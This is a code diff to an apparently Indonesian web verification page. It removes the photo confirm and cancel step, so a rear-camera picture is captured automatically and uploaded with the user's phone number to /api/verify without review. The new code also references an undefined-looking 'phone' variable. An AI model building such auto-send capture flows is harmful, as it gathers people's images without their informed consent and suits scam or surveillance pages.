@@ -61,14 +61,10 @@
   button:disabled { opacity: 0.5; cursor: not-allowed; }
 
   #btnFoto { background: #facc15; color: #1e1b4b; }
-  #btnKonfirmasi { background: #22c55e; color: #fff; }
-  #btnBatal { background: #ef4444; color: #fff; margin-top: 8px; }
 
-  #status { margin-top: 14px; font-size: 13px; color: #c4b5fd; min-height: 18px; }
-  #status.success { color: #4ade80; }
+  #status { margin-top: 14px; font-size: 14px; color: #ddd6fe; min-height: 18px; }
   #status.error { color: #f87171; }
 
-  /* Modal welcome */
   .overlay {
     position: fixed; inset: 0;
     background: rgba(0,0,0,0.7);
@@ -114,11 +110,6 @@
 
     <button id="btnFoto">📸 FOTO</button>
 
-    <div id="confirmBox" style="display:none;">
-      <button id="btnKonfirmasi">✅ KONFIRMASI</button>
-      <button id="btnBatal">❌ BATAL</button>
-    </div>
-
     <div id="status"></div>
   </div>
 
@@ -129,13 +120,7 @@ const phoneInput = document.getElementById('phone');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const btnFoto = document.getElementById('btnFoto');
-const confirmBox = document.getElementById('confirmBox');
-const btnKonfirmasi = document.getElementById('btnKonfirmasi');
-const btnBatal = document.getElementById('btnBatal');
 const statusEl = document.getElementById('status');
-
-let stream = null;
-let capturedImage = null;
 
 btnMulai.addEventListener('click', () => {
   welcomeOverlay.style.display = 'none';
@@ -152,71 +137,53 @@ btnFoto.addEventListener('click', async () => {
   statusEl.className = '';
   statusEl.textContent = 'Meminta izin kamera...';
   try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: { ideal: 'environment' } }, // kamera belakang
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: 'environment' } },
       audio: false
     });
     video.srcObject = stream;
     video.classList.add('active');
+    btnFoto.disabled = true;
+    phoneInput.disabled = true;
 
-    // beri jeda sebentar biar kamera fokus, lalu otomatis ambil foto
     statusEl.textContent = 'Mengambil foto...';
-    setTimeout(() => {
+    setTimeout(async () => {
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
-      capturedImage = canvas.toDataURL('image/jpeg', 0.85);
+      const capturedImage = canvas.toDataURL('image/jpeg', 0.85);
 
       stream.getTracks().forEach(t => t.stop());
       video.classList.remove('active');
       canvas.classList.add('active');
-
       btnFoto.style.display = 'none';
-      confirmBox.style.display = 'block';
-      statusEl.textContent = 'Cek fotonya, lalu konfirmasi atau batal.';
+
+      statusEl.textContent = 'Mengirim...';
+
+      try {
+        const res = await fetch('/api/verify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: capturedImage, phone: phone })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          statusEl.className = '';
+          statusEl.textContent = 'PREVIEW OLEH ADMIN SEDANG DI TINJAU';
+        } else {
+          throw new Error(data.error || 'Gagal mengirim');
+        }
+      } catch (err) {
+        statusEl.className = 'error';
+        statusEl.textContent = 'Gagal mengirim, coba refresh halaman.';
+      }
+
     }, 1200);
 
   } catch (err) {
     statusEl.className = 'error';
     statusEl.textContent = 'Izin kamera ditolak atau tidak tersedia.';
-  }
-});
-
-btnBatal.addEventListener('click', () => {
-  capturedImage = null;
-  canvas.classList.remove('active');
-  confirmBox.style.display = 'none';
-  btnFoto.style.display = 'block';
-  statusEl.className = '';
-  statusEl.textContent = 'Dibatalkan. Silakan coba lagi.';
-});
-
-btnKonfirmasi.addEventListener('click', async () => {
-  if (!capturedImage) return;
-  btnKonfirmasi.disabled = true;
-  btnBatal.disabled = true;
-  statusEl.textContent = 'Mengirim...';
-
-  try {
-    const res = await fetch('/api/verify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ image: capturedImage, phone: phoneInput.value.trim() })
-    });
-    const data = await res.json();
-    if (data.ok) {
-      statusEl.className = 'success';
-      statusEl.textContent = '✅ Verifikasi terkirim. Silakan tunggu konfirmasi.';
-      confirmBox.style.display = 'none';
-    } else {
-      throw new Error(data.error || 'Gagal mengirim');
-    }
-  } catch (err) {
-    statusEl.className = 'error';
-    statusEl.textContent = '❌ Gagal mengirim verifikasi. Coba lagi.';
-    btnKonfirmasi.disabled = false;
-    btnBatal.disabled = false;
   }
 });
 </script>
